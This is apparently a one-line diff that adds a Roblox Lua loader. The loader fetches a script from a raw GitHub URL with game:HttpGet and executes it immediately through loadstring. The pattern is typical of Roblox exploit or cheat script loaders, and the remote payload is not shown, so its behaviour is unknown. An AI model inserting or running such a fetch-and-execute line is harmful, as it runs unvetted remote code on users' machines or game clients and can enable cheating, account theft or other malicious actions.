@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/creepstu/ubiquitous-octo-succotash/main/superlua'))()
